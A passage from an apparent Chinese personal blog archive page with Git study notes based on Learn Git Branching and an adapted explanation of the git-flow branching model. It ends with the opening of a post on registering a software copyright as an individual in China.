                    <span>abbrlink :</span>
                    <span>707592dd</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <blockquote>
<p>本文为可视化Git学习项目的学习笔记。初级操作可视化学习：<a href="https://learngitbranching.js.org/?locale=zh_CN">Learn Git Branching</a></p>
<p>项目地址：<a href="https://github.com/pcottle/learnGitBranching">pcottle/learnGitBranching: An interactive git visualization and tutorial. Aspiring students of git can use this app to educate and challenge themselves towards mastery of git! (github.com)</a></p>
</blockquote>
<blockquote>
<p>Git文档：<a href="https://git-scm.com/doc">Git - Documentation (git-scm.com)</a></p>
</blockquote>
<h1>Git基本操作</h1>
<h2>基本</h2>
<pre><code class="language-bash">git commit # 新建提交记录
git log    # 查看提交记录的hash值

git branch &lt;branch_name&gt;		 	# 新建分支
git checkout &lt;branch/node&gt; 			# 切换分支或node
git checkout -b &lt;your-branch-name&gt; 	# 新建并切换分支

# 分支合并
git merge &lt;branch_name&gt; 	# 合并branch_name分支到当前分支
git rebase &lt;branch_name&gt; 	# 把当前分支里的工作直接移到branch_name上

# 自由在提交树移动（支持链式操作）
# 相对引用
^ 		# 向上移动一个提交记录
^^ 		# 向上移动两个提交记录
~&lt;num&gt; 	# 向上移动多个提交记录

# 选择父提交记录
^&lt;num&gt;	# 指定合并提交记录的某个父提交。(一个合并提交有两个父提交)

git branch -f &lt;branch&gt; &lt;node&gt; # 强制修改branch分支位置
# e.g. git branch -f main HEAD~3
</code></pre>
<h2>Rebase</h2>
<p>Rebase 实际上就是取出一系列的提交记录，“复制”它们，然后在另外一个地方逐个的放下去。</p>
<p>Rebase 的优势就是可以创造更线性的提交历史，这听上去有些难以理解。如果只允许使用 Rebase 的话，代码库的提交历史将会变得异常清晰。</p>
<h2>HEAD</h2>
<p>HEAD 是一个对当前所在分支的符号引用 —— 也就是指向你正在其基础上进行工作的提交记录。</p>
<p>HEAD 总是指向当前分支上最近一次提交记录。大多数修改提交树的 Git 命令都是从改变 HEAD 的指向开始的。</p>
<p>HEAD 通常情况下是指向分支名的（用*表示）。分离的 HEAD 就是让其指向了某个具体的提交记录而不是分支名。</p>
<h2>撤销变更</h2>
<pre><code class="language-sh">git reset &lt;node&gt;  
</code></pre>
<p>通过把分支记录回退几个提交记录来实现撤销改动（对远程分支无效）。</p>
<p>例如：在C2处执行<code>git reset HEAD~1</code></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230527163230995.png" alt="image-20230527163230995"></p>
<pre><code class="language-sh">git revert &lt;node&gt; 
</code></pre>
<p>例如：在C2处执行<code>git revert HEAD </code></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230527163039945.png" alt="image-20230527163039945"></p>
<p>要撤销的提交记录后面多了一个新提交。新提交记录 C2' 引入了更改 —— 这些更改刚好是用来撤销 C2 这个提交的。也就是说 C2' 的状态与 C1 是相同的。revert 之后就可以把你的更改推送到远程仓库。</p>
<h2>修改分支树</h2>
<pre><code class="language-sh">git cherry-pick &lt;node&gt;...
</code></pre>
<p>将一些提交复制到当前所在位置。cherry-pick 可以将提交树上任何地方的提交记录取过来追加到 HEAD 上（只要不是 HEAD 上游的提交就没问题）。</p>
<pre><code class="language-sh">git rebase --interactive &lt;node&gt;
</code></pre>
<p>如果你在命令后增加了这个选项, Git 会打开一个 UI 界面并列出将要被复制到目标分支的备选提交记录，它还会显示每个提交记录的哈希值和提交说明，提交说明有助于你理解这个提交进行了哪些更改。</p>
<p>可以进行以下操作：</p>
<ul>
<li>
<p>调整记录顺序</p>
</li>
<li>
<p>删除不想要的提交</p>
</li>
<li>
<p>合并提交</p>
</li>
</ul>
<blockquote>
<p>本地栈式提交</p>
<ul>
<li>
<p>一个在开发中经常会遇到的情况：我正在解决某个特别棘手的 Bug，为了便于调试而在代码中添加了一些调试命令并向控制台打印了一些信息。这些调试和打印语句都在它们各自的提交记录里。最后我终于找到了造成这个 Bug 的根本原因。最后就差把 <code>bugFix</code> 分支里的工作合并回 <code>main</code> 分支了。你可以选择通过 fast-forward 快速合并到 <code>main</code> 分支上，但这样的话 <code>main</code> 分支就会包含我这些调试语句了。你肯定不想这样，应该还有更好的方式……<br>
答案：使用上述命令修改分支树</p>
</li>
<li>
<p>接下来这种情况也是很常见的：你之前在 <code>newImage</code> 分支上进行了一次提交，然后又基于它创建了 <code>caption</code> 分支，然后又提交了一次。此时你想对某个以前的提交记录进行一些小小的调整。比如设计师想修改一下 <code>newImage</code> 中图片的分辨率，尽管那个提交记录并不是最新的了。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230527165217947.png" alt="image-20230527165217947"><br>
答案：我们可以通过下面的方法来克服困难：</p>
<ul>
<li>先用 <code>git rebase -i</code> 将提交重新排序，然后把我们想要修改的提交记录挪到最前</li>
<li>然后用 <code>git commit --amend</code> 来进行一些小修改</li>
<li>接着再用 <code>git rebase -i</code> 来将他们调回原来的顺序</li>
<li>最后我们把 main 移到修改的最前端（用你自己喜欢的方法）</li>
</ul>
<p>但这样做就唯一的问题就是要进行两次排序，而这有可能造成由 rebase 而导致的冲突。尝试使用cherry-pick。</p>
</li>
</ul>
</blockquote>
<h2>Tag与Describe</h2>
<pre><code class="language-sh">git tag &lt;your_tag&gt; [node]
</code></pre>
<p>分支很容易被人为移动，并且当有新的提交时，它也会移动。分支很容易被改变，大部分分支还只是临时的，并且还一直在变。</p>
<p>有没有什么可以<em>永远</em>指向某个提交记录的标识呢，比如软件发布新的大版本，或者是修正一些重要的 Bug 或是增加了某些新特性，有没有比分支更好的可以永远指向这些提交的方法呢？</p>
<p>Git 的 tag 可以（在某种程度上 —— 因为标签可以被删除后重新在另外一个位置创建同名的标签）永久地将某个特定的提交命名为里程碑，然后就可以像分支一样引用了。</p>
<p>更难得的是，它们并不会随着新的提交而移动。你也不能切换到某个标签上面进行修改提交，它就像是提交树上的一个锚点，标识了某个特定的位置。</p>
<pre><code class="language-sh">git describe &lt;ref&gt;
# &lt;ref&gt; 可以是任何能被 Git 识别成提交记录的引用，如果你没有指定的话，Git 会使用你目前所在的位置（HEAD）。
# 输出结果：&lt;tag&gt;_&lt;numCommits&gt;_g&lt;hash&gt;
</code></pre>
<p>由于标签在代码库中起着“锚点”的作用，Git 还为此专门设计了一个命令用来<strong>描述</strong>离你最近的锚点（也就是标签），它就是 <code>git describe</code>！</p>
<p>Git Describe 能帮你在提交历史中移动了多次以后找到方向；当你用 <code>git bisect</code>（一个查找产生 Bug 的提交记录的指令）找到某个提交记录时，或者是当你坐在你那刚刚度假回来的同事的电脑前时， 可能会用到这个命令。</p>
<h1>远程仓库操作</h1>
<h2>基本操作</h2>
<p>远程仓库实际上它们只是你的仓库在另个一台计算机上的拷贝。</p>
<p>远程分支反映了远程仓库（在你上次和它通信时）的<strong>状态</strong>。这会有助于你理解本地的工作与公共工作的差别。</p>
<p>远程分支有一个特别的属性，在你切换到远程分支时，自动进入分离 HEAD 状态。Git 这么做是出于不能直接在这些分支上进行操作的原因, 你必须在别的地方完成你的工作, （更新了远程分支之后）再用远程分享你的工作成果。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230527173159602.png" alt="image-20230527173159602"></p>
<p>远程分支有一个命名规范 —— 它们的格式是<code>&lt;remote name&gt;/&lt;branch name&gt;</code></p>
<pre><code class="language-sh">git fetch
</code></pre>
<p><code>git fetch</code> 完成了仅有的但是很重要的两步:</p>
<ul>
<li>从远程仓库下载本地仓库中缺失的提交记录</li>
<li>更新远程分支指针(如 <code>origin/main</code>)</li>
</ul>
<p><code>git fetch</code> 实际上将本地仓库中的远程分支更新成了远程仓库相应分支最新的状态。<code>git fetch</code> 并不会改变你本地仓库的状态。它不会更新你的 <code>main</code> 分支，也不会修改你磁盘上的文件。理解这一点很重要，因为许多开发人员误以为执行了 <code>git fetch</code> 以后，他们本地仓库就与远程仓库同步了。它可能已经将进行这一操作所需的所有数据都下载了下来，但是<strong>并没有</strong>修改你本地的文件。所以, 你可以将 <code>git fetch</code> 的理解为单纯的下载操作。</p>
<pre><code class="language-sh">git pull
# 相当于以下两条命令，pull 就是 fetch + merge
git fetch
git merge origin/main
</code></pre>
<p>实际上，由于先抓取更新再合并到本地分支这个流程很常用，因此 Git 提供了一个专门的命令来完成这两个操作。</p>
<pre><code class="language-sh">git push
</code></pre>
<p><code>git push</code> 负责将<strong>你的</strong>变更上传到指定的远程仓库，并在远程仓库上合并你的新提交记录。<em><code>git push</code> 不带任何参数时的行为与 Git 的一个名为 <code>push.default</code> 的配置有关。它的默认值取决于你正使用的 Git 的版本，但是在教程中我们使用的是 <code>upstream</code>。</em></p>
<h2>冲突处理</h2>
<p>假设你周一克隆了一个仓库，然后开始研发某个新功能。到周五时，你新功能开发测试完毕，可以发布了。但是 —— 天啊！你的同事这周写了一堆代码，还改了许多你的功能中使用的 API，这些变动会导致你新开发的功能变得不可用。但是他们已经将那些提交推送到远程仓库了，因此你的工作就变成了基于项目<strong>旧版</strong>的代码，与远程仓库最新的代码不匹配了。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230527175900652.png" alt="image-20230527175900652"></p>
<p>这种情况下, <code>git push</code> 就不知道该如何操作了。如果你执行 <code>git push</code>，Git 应该让远程仓库回到星期一那天的状态吗？还是直接在新代码的基础上添加你的代码，亦或由于你的提交已经过时而直接忽略你的提交？</p>
<p>因为这情况（历史偏离）有许多的不确定性，Git 是不会允许你 <code>push</code> 变更的。实际上它会强制你先合并远程最新的代码，然后才能分享你的工作。</p>
<p>那该如何解决这个问题呢？很简单，你需要做的就是使你的工作基于最新的远程分支。有许多方法做到这一点呢，不过最直接的方法就是通过 rebase 调整你的工作：</p>
<pre><code class="language-sh">git fetch
git rebase o/main
git push
# 相当于 git pull --rebase; git push
</code></pre>
<p><img src="https://cdn.gallery.uuanqin.top/img/origin_rebase.gif" alt="origin_rebase"></p>
<p>我们还可以使用 <code>merge</code></p>
<p>尽管 <code>git merge</code> 不会移动你的工作（它会创建新的合并提交），但是它会告诉 Git 你已经合并了远程仓库的所有变更。这是因为远程分支现在是你本地分支的祖先，也就是说你的提交已经包含了远程分支的所有变化：</p>
<pre><code class="language-sh">git fetch
git merge o/main
git push
# 相当于 git pull; git push;
</code></pre>
<p><img src="https://cdn.gallery.uuanqin.top/img/origin_merge.gif" alt="origin_merge"></p>
<p>在开发社区里，有许多关于 merge 与 rebase 的讨论。以下是关于 rebase 的优缺点：</p>
<p>优点：Rebase 使你的提交树变得很干净, 所有的提交都在一条线上</p>
<p>缺点：Rebase 修改了提交树的历史</p>
<p>选择哪个，仁者见仁智者见智。</p>
<h2>远程跟踪分支</h2>
<p>跟踪：</p>
<ul>
<li>pull 操作时，提交记录会被先下载到 origin/main 上，之后再合并到本地的 main 分支。隐含的合并目标由这个关联确定的。</li>
<li>push 操作时，我们把工作从 <code>main</code> 推到远程仓库中的 <code>main</code> 分支(同时会更新远程分支 <code>origin/main</code>) 。这个推送的目的地也是由这种关联确定的！</li>
</ul>
<p>当你克隆时, Git 会为远程仓库中的每个分支在本地仓库中创建一个远程分支（比如 <code>origin/main</code>）。然后再创建一个跟踪远程仓库中活动分支的本地分支，默认情况下这个本地分支会被命名为 <code>main</code>。</p>
<p>我们可以自己指定这种属性：</p>
<p>有两种方法：</p>
<p>第一种就是通过远程分支切换到一个新的分支，执行:</p>
<pre><code>git checkout -b totallyNotMain origin/main
</code></pre>
<p>就可以创建一个名为 <code>totallyNotMain</code> 的分支，它跟踪远程分支 <code>origin/main</code>。</p>
<p>第二种工作方法：</p>
<p>另一种设置远程追踪分支的方法就是使用：<code>git branch -u</code> 命令，执行：</p>
<pre><code class="language-sh">git branch -u origin/main foo # 如果当前就在 foo 分支上, 还可以省略 foo
</code></pre>
<h3>Git Push的参数</h3>
<pre><code class="language-sh">git push &lt;remote&gt; &lt;place&gt;
</code></pre>
<p>例子：<code>git push origin main</code></p>
<p>含义：*切到本地仓库中的“main”分支，获取所有的提交，再到远程仓库“origin”中找到“main”分支，将远程仓库中没有的提交记录都添加上去，搞定之后告诉我。*我们通过“place”参数来告诉 Git 提交记录来自于 main, 要推送到远程仓库中的 main。它实际就是要同步的两个仓库的位置。需要注意的是，因为我们通过指定参数告诉了 Git 所有它需要的信息，所以它就忽略了我们所切换分支的属性（就是说不管你的HEAD在哪）！</p>
<p>当为 git push 指定 place 参数为 <code>main</code> 时，我们同时指定了提交记录的<strong>来源</strong>和<strong>去向</strong>。要同时为源和目的地指定 <code>&lt;place&gt;</code> 的话，只需要用冒号 <code>:</code> 将二者连起来就可以了：</p>
<pre><code class="language-sh">git push origin &lt;source&gt;:&lt;destination&gt;
</code></pre>
<p>这个参数实际的值是个 refspec，“refspec” 是一个自造的词，意思是 Git 能识别的位置（比如分支 <code>foo</code> 或者 <code>HEAD~1</code>）。如果你要推送到的目的分支不存在，Git 会在远程仓库中根据你提供的名称帮你创建这个分支。</p>
<h3>Git Fetch的参数</h3>
<p><code>git fetch</code> 的参数和 <code>git push</code> 极其相似。他们的概念是相同的，只是方向相反罢了（因为现在你是下载，而非上传）如果你像如下命令这样为 git fetch 设置 的话：</p>
<pre><code class="language-sh">git fetch origin foo
</code></pre>
<p>Git 会到远程仓库的 <code>foo</code> 分支上，然后获取所有本地不存在的提交，放到本地的 <code>origin/foo</code> 上。</p>
<p>“如果我们指定 <code>&lt;source&gt;:&lt;destination&gt;</code> 会发生什么呢？”</p>
<p>如果你觉得直接更新本地分支很爽，那你就用冒号分隔的 refspec 吧。不过，你不能在当前切换的分支上干这个事，但是其它分支是可以的。</p>
<p>这里有一点是需要注意的 —— <code>source</code> 现在指的是远程仓库中的位置，而 <code>&lt;destination&gt;</code> 才是要放置提交的本地仓库的位置。它与 git push 刚好相反，这是可以讲的通的，因为我们在往相反的方向传送数据。</p>
<p>理论上虽然行的通，但开发人员很少这么做。我在这里介绍它主要是为了从概念上说明 <code>fetch</code> 和 <code>push</code> 的相似性，只是方向相反罢了。</p>
<p>如果执行命令前目标分支不存在，Git 会在 fetch 前自己创建立本地分支，就像是 Git 在 push 时，如果远程仓库中不存在目标分支，会自己在建立一样。</p>
<p>如果 <code>git fetch</code> 没有参数，它会下载所有的提交记录到各个远程分支。</p>
<h3>不指定<code>&lt;source&gt;</code></h3>
<p>在 git push 或 git fetch 时不指定任何 <code>source</code>，方法就是仅保留冒号和 destination 部分，source 部分留空。</p>
<p>例如：<code>git push origin :side</code>和<code>git fetch origin :bugFix</code></p>
<ul>
<li>
<p>给 push 传空值 source，成功删除了远程仓库中的 <code>side</code> 分支</p>
</li>
<li>
<p>如果 fetch 空 到本地，会在本地创建一个新分支。</p>
</li>
</ul>
<h3>Git Pull</h3>
<pre><code class="language-sh">git pull origin foo # git fetch origin foo; git merge origin/foo
git pull origin bar~1:bugFix # git fetch origin bar~1:bugFix; git merge bugFix
</code></pre>


                
            </main>

            <footer class="list-content-container">
                

                
            </footer>
        </article>
        
        <article id="1857161372" class="record">
            <header>
                <h1 class="record-title">Git-flow：git的分支管理策略</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>undefined</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('git');">git</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>5/27/2023</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/git-flowcover555555.png</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>这是一篇对分支管理策略学习和探讨。</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>6eb2089c</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <p><a href="https://nvie.com/posts/a-successful-git-branching-model/">A successful Git branching model</a>是一篇有名的分支管理策略（Git-Flow）的学习，下面文章以这篇文章为基础，介绍Git-Flow工作流，顺便练一下英语。这篇不是简单的英文翻译，里面杂合了我的理解与外部参考。</p>
<blockquote>
<p>参考：</p>
<ul>
<li><a href="https://nvie.com/posts/a-successful-git-branching-model/">A successful Git branching model » nvie.com</a></li>
<li><a href="http://www.ruanyifeng.com/blog/2012/07/git.html">Git分支管理策略 - 阮一峰的网络日志 (ruanyifeng.com)</a></li>
</ul>
</blockquote>
<h1>前言</h1>
<p>这篇文章诞生于10年前，那时Git刚诞生不久。在这10年里，许多团队都把它当成了“准则”和“灵丹妙药”。现在，越来越多的软件类型转向了web应用，而这些应用一般是持续交付的，而不是回滚式的，因此不需要支持多版本管理。如果软件开发团队正在做持续交付的软件，那么可以参考更简单的工作流（如<a href="https://docs.github.com/zh/get-started/quickstart/github-flow">GitHub 流</a>）而不是非得使用git-flow。</p>
<p>当然了，学习前需要记住，世界上没有灵丹妙药。要考虑自己的情况选择自己的工作流。</p>
<h1>为什么选择Git</h1>
<p>Git改变了程序员对“合并/分支”的看法。以前（CVS/Subversion时代），“合并/分支”有点可怕：小心合并冲突，不然它会咬你！但有了Git，这些操作将变得成本低廉和简单。由于其简单和可重复性的特性，“合并/分支”不再可怕。</p>
<h1>“去中心化”了但是还要“中心化”</h1>
<p>因为Git是DVCS（分布式管理系统），在技术层面上就没有诸如”中心化“仓库的东西。但是要让我们的模型工作得好，首先就得有一个“中心”的“真实”的仓库。这个中心化的仓库我们称为<code>origin</code>（这个名字对Git用户来说比较熟悉）</p>
<img src="https://cdn.gallery.uuanqin.top/img/centr-decentr@2x.png" style="zoom:50%;" />
<p>每一个开发人员都从<code>origin</code>中拉取和推送，与此同时成员之间也互相拉取形成子团队。这适用于2到3个开发人员在对一个软件的重要特性的进行开发的场景。</p>
<p>上图中，alice和bob、alice和david、david和clair组成了子团队，这意味着Alice定义了一个远程Git仓库名为bob，反之亦然。</p>
<h1>主分支</h1>
<p>中心仓库掌握两个主要的分支，它们有着无限的生命周期：</p>
<ul>
<li>master分支：主要分支，<code>HEAD</code>总是指向一个“可以作为产品发布”的状态。</li>
<li>develop分支：主要分支，<code>HEAD</code>总是指向为下一个版本做准备的最新交付开发版本，它包含了一些针对下一个版本的更改。</li>
</ul>
<img src="https://cdn.gallery.uuanqin.top/img/main-branches@2x.png" alt="img" style="zoom:50%;" />
<p>当develop中的源代码趋向稳定且做好发布准备时，所有的改变都应以某种方法“合并”回master，并打上版本标签。因此，每一次把所有改变合并回master，根据定义，这将是一个全新的发行版本。对于这一点，我们应严格遵守。所以从理论上来讲，每一次master分支存在提交，我们编写的Git Hook脚本会自动构建并导出我们的软件产品到产品服务器。</p>
<h1>辅助分支</h1>
<p>次于master和develop两个主分支，我们的开发模型使用许多辅助分支以帮助团队成员之间的平行开发、简化特性的追踪、为版本发行做好准备以及对产品临时出现的问题进行修复。与主分支不同，这些分支总是有着有限的生存周期，它们最终将会被永久地移除。</p>
<p>我们可能会用到的不同辅助分支：</p>
<ul>
<li>特性分支（Feature branches）</li>
<li>预发行分支（Release branches）</li>
<li>热修复分支（Hotfix branches）</li>
</ul>
<p>这些分支有不同的目的，且各自有严格规则约束，这些规则规定了它们原分支和目的分支。从技术上来讲，这些分支并不十分“特殊”，它们都是一般的Git分支，只不过我们以“使用它的方式”进行分类罢了。</p>
<h3>特性分支</h3>
<table>
<thead>
<tr>
<th>可能从哪个分支分出来</th>
<th>必须合并回哪个分支去</th>
<th>习惯命名</th>
</tr>
</thead>
<tbody>
<tr>
<td>develop</td>
<td>develop</td>
<td>除了叫master、develop、release-*或hotfix-*，其他都可以</td>
</tr>
</tbody>
</table>
<p>特性分支（有时也称主题分支）是用来开发即将到来或远期发行版本新特性的分支。当我们开始开发一个特性时，包含这个特性的发行版本是未知的。特性分支的本质是，只要这个特性还在开发中，它就一直存在，但最终会合并回develop（这就决定了新特性将加入即将发行的版本之中）或丢弃（以防最终的结果令人失望）。</p>
<p>特性分支一般只存在于开发中的仓库，而不在<code>origin</code>。</p>
<img src="https://cdn.gallery.uuanqin.top/img/fb@2x.png" alt="img" style="zoom:50%;" />
<h4>创建特性分支</h4>
<p>当我们开始在新特性上进行开发时，我们从develop中分出新分支</p>
<pre><code class="language-sh">git checkout -b myfeature develop
# git checkout [-b &lt;new-branch&gt;] [&lt;start-point&gt;]
# Create a new branch named &lt;new-branch&gt;, start it at &lt;start-point&gt;, and check the resulting branch out
</code></pre>
<h4>在develop分支中合并完成的特性</h4>
<p>开发完成的特性将合并到develop分支中，这就决定了即将发行的版本将包含这个特性。</p>
<pre><code class="language-sh"># 合并新特性
git checkout develop	# Switched to branch 'develop'
git merge --no-ff myfeature
# 删除特性分支
git branch -d myfeature
# git branch -d &lt;branchname&gt;
# Delete a branch. 
git push origin develop
</code></pre>
<p>--no-ff参数解释：</p>
<p>默认情况下，Git执行&quot;快进式合并&quot;（fast-farward merge，参考<a href="https://sandofsky.com/static/images/fast_forward.pdf">fast_forward</a>），会直接将Master分支指向Develop分支。使用--no-ff参数后，会执行正常合并，在Master分支上生成一个新节点。为了保证版本演进的清晰，我们希望采用这种做法（即使这样做会产生空的commit结点，但利大于弊）。</p>
<img src="https://cdn.gallery.uuanqin.top/img/--no-ff-awdwdwedwad.png" alt="img" style="zoom: 50%;" />
<h3>预发行分支</h3>
<table>
<thead>
<tr>
<th>可能从哪个分支分出来</th>
<th>必须合并回哪个分支去</th>
<th>习惯命名</th>
</tr>
</thead>
<tbody>
<tr>
<td>develop</td>
<td>develop，master</td>
<td>release-*</td>
</tr>
</tbody>
</table>
<p>预发布分支，它是指发布正式版本之前（即合并到Master分支之前），我们可能需要有一个预发布的版本进行测试。</p>
<p>预发行分支辅助新产品发行的准备工作，They allow for last-minute dotting of i’s and crossing t’s. 此外，它允许小错误的修复且为一个发行版本准备元数据（版本号、构建日期等）。通过所有在预发行分支所做的工作，develop分支将被清除以接收下一个大版本的发行。</p>
<p>从develop分支分叉处新的预发行分支的时刻，就是develop（几乎）反应新发行版本的理想状态的时刻，至少此时所有指向正在构建的发行版本的特性已经合并到develop中（但是指向未来发行版本的特性也许还没有合并进去，它们必须等到那个版本被分出来后，才考虑进行合并）。</p>
<p>正是在预发行分支存在开始，预发布的版本将被指定一个版本号（不会更早），一直到develop分支反映下一个发行版本变动的那一刻。但是，预发行版本的版本号最终是0.3还是1.0我们是不清楚的。版本号的决定是从预发行分支开始，并由项目的版本号制定规则决定。</p>
<h4>创建一个预发行分支</h4>
<p>预发行分支从develop分支分流出来的。例如，现在的产品版本为1.1.5，我们将有一个大的发行版本出现，develop分支也已经为下一个发行版本准备好了，而且我们决定这个版本将为1.2（而不是1.1.6或2.0）。所以我们分出一条预发行版本分支，其名字反映了新的版本号：</p>
<pre><code class="language-sh">git checkout -b release-1.2 develop # 切换到新分支 &quot;release-1.2&quot;
./bump-version.sh 1.2 # 文件修改成功，版本升级至1.2
git commit -a -m &quot;Bumped version number to 1.2&quot;
# --all: Tell the command to automatically stage files that have been modified and deleted, but new files you have not told Git about are not affected.
# -m &lt;msg&gt;: Use the given &lt;msg&gt; as the commit message.
</code></pre>
<p>在创建新分支并切换到它之后，我们提升了版本号。<code>./bump-version.sh</code>在这里是一个虚构的shell脚本，他将改变当前工作中的文件（副本）以反映新的版本（当然，你可以自己手动更改，就是一些文件的更改）。最后，提升的版本号将被提交。</p>
<p>新的分支也许会存在一段时间，直到这个发行版被推出。在这段时间中，release分支会有很多bug修复（而不是在develop分支中），但严格禁止在这里增加大的特性。大的特性应该合并到develop分支中，并等待下一个发行版本。</p>
<h4>完成一个预发行分支</h4>
<p>当预发行分支准备好发行时，我们必须进行一些操作。首先，预发行分支合并到master分支中（别忘了，master中的每次提交代表的是一个新的发行版本）。其次，master中的提交必须被贴上标签以便未来对这个历史版本的参考。最后，预发行分支中的改变需要合并回develop，这样未来的发行版本中将会包含这些bug修复。</p>
<p>在Git中提交的步骤：</p>
<pre><code class="language-sh">git checkout master
git merge --no-ff release-1.2
git tag -a 1.2
# -a: Make an unsigned, annotated tag object
# 你还可以使用以下标签
# -s: Make a GPG-signed tag, using the default e-mail address’s key. 
# -u &lt;key-id&gt;: Make a GPG-signed tag, using the given key.
</code></pre>
<p>预发行已经完成，且进行了标签标注以便未来的参考。</p>
<p>为了保证预发行分支中的改变得到保留，我们需要将其合并到develop分支。在Git中这样做：</p>
<pre><code class="language-sh">git checkout develop # Switched to branch 'develop'
git merge --no-ff release-1.2
</code></pre>
<p>这个步骤可能会导致合并冲突（或者说是必定冲突，因为我们改变了版本号），如果真的这样那就修复它然后提交。</p>
<p>现在我们真的要完事了，这个分支我们已经不需要了，把它删掉：</p>
<pre><code class="language-sh">git branch -d release-1.2
</code></pre>
<h3>热修复分支</h3>
<table>
<thead>
<tr>
<th>可能从哪个分支分出来</th>
<th>必须合并回哪个分支去</th>
<th>习惯命名</th>
</tr>
</thead>
<tbody>
<tr>
<td>master</td>
<td>develop，master</td>
<td>hotfix-*</td>
</tr>
</tbody>
</table>
<img src="https://cdn.gallery.uuanqin.top/img/hotfix-branches@2x.png" alt="img" style="zoom:50%;" />
<p>热修复分支非常像预发行分支，因为它也是为新产品发行做准备。它的出现是为了应对当前版本中出现的错误情况。当现行发行的产品出现一个紧急的Bug，它必须立即修复，这时热修复分支会从master分支中对应版本的tag分流出来。</p>
<p>它的本质就是要在develop进行开发的工作团队继续它们的工作，要另一个人去准备好修复这个Bug。</p>
<h4>创建热修复分支</h4>
<p>热修复分支可以从master分支中创建。例如，版本1.2是当前产品发行版本，然而出现了严重Bug。但是develop分支中的改变还是不稳定的，我们需要分支出热修复分支并着手开始解决问题。</p>
<pre><code class="language-sh">git checkout -b hotfix-1.2.1 master # Switched to a new branch &quot;hotfix-1.2.1&quot;
./bump-version.sh 1.2.1 # 文件修改成功，版本升级至1.2.1
git commit -a -m &quot;Bumped version number to 1.2.1&quot;
</code></pre>
<p>别忘了分支出热修复分支后提升版本号。</p>
<p>大约提交几次commit后，修复好Bug。</p>
<pre><code class="language-sh">git commit -m &quot;Fixed severe production problem&quot;
</code></pre>
<h4>完成热修复分支</h4>
<p>完成Bug修复后，需要把热修复分支合并到master中以及develop中，这是为了保证修复后的内容也被下一个版本包含。这就很像预发布分支完成后的操作。</p>
<p>首先，更新master并标注发行版本：</p>
<pre><code class="language-sh">git checkout master
git merge --no-ff hotfix-1.2.1
git tag -a 1.2.1
# 你还可以使用以下标签
# -s: Make a GPG-signed tag, using the default e-mail address’s key. 
# -u &lt;key-id&gt;: Make a GPG-signed tag, using the given key.
</code></pre>
<p>然后，把Bug的修复也合并到develop中：</p>
<pre><code class="language-sh">git checkout develop # Switched to branch 'develop'
git merge --no-ff hotfix-1.2.1
</code></pre>
<p>有一个例外规则是：<strong>当预发布分支存在时，热修复中的改变需要合并到这个预发布分支，而不是develop</strong>。合并的预发布分支的修复，会在预发布分支完成后最终合并到develop中。当然，如果develop分支急需这个修复，你也可以安全的合并到develop中。</p>
<p>最后，移除热修复分支这个临时分支。</p>
<pre><code class="language-sh">git branch -d hotfix-1.2.1
</code></pre>
<h1>总结</h1>
<p>如果这个分支模型没有什么重大改变，下面这张图将对你的项目非常有用。<img src="https://cdn.gallery.uuanqin.top/img/git-model@2x.png" alt="img" style="zoom: 67%;" /></p>
<blockquote>
<p>Author: Vincent Driessen</p>
<p>Original blog post: <a href="http://nvie.com/posts/a-succesful-git-branching-model">http://nvie.com/posts/a-succesful-git-branching-model</a></p>
<p>License: Creative Commons BY-SA</p>
</blockquote>
<h1>推荐阅读</h1>
<p><a href="https://www.conventionalcommits.org/zh-hans/v1.0.0/">约定式提交 (conventionalcommits.org)</a></p>


                
            </main>

            <footer class="list-content-container">
                

                
            </footer>
        </article>
        
        <article id="1360801971" class="record">
            <header>
                <h1 class="record-title">个人独立申请软著流程</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>undefined, 社会生活</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('软著');">软著</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>5/31/2023</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/cpcccover.webp</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>分享个人申请独立开发软件的软件著作权过程。</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>511c30b3</span>
                </div>
                
            </header>

            <main class="record-content">
                <p>写毕业设计之前就有个想法为我自己开发的系统申请软件著作权，现在动手尝试，将主要步骤记录如下。</p>
<blockquote>
<p>[!hint]<br>
本篇文章以个人申请方式（个人开发）介绍过程，合作开发、学校署名等问题不在本文范围内。</p>
</blockquote>
<p>官网：<a href="https://www.ccopyright.com.cn/">中国版权保护中心 (ccopyright.com.cn)</a></p>
<h1>前言：新的申请流程</h1>
<p>我发现这个官网会莫名抽风，各种连接错误、系统错误和卡顿。然后在登记过程（5 月 31 日）中，每一次提交的申请会出现不同的流程和页面 UI。有时候给你邮寄提示，有时候又没有，并多出签章页打印环节而取消。当我隐隐约约觉察是不是流程改了，就随手翻翻通知。发现 5 月 25 日新通知 [^new]：</p>
<p>[^new]: <a href="https://www.ccopyright.com.cn/index.php?optionid=998&amp;method=view&amp;optionid=998&amp;auto_id=1005">关于软件版权登记网上办理试运行的通知-中心公告-中国版权保护中心 (ccopyright.com.cn)</a>：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230601115747781.png" alt="image-20230601115747781"></p>
<p>woc🤬，怪不得服务器抽风一阵后系统大变样。流程确实改了，这也说明网上的经验全没用了，接下来我的探索成果将是最早一批的改版经验！（后果：白花 10 块钱印了一堆废纸）</p>
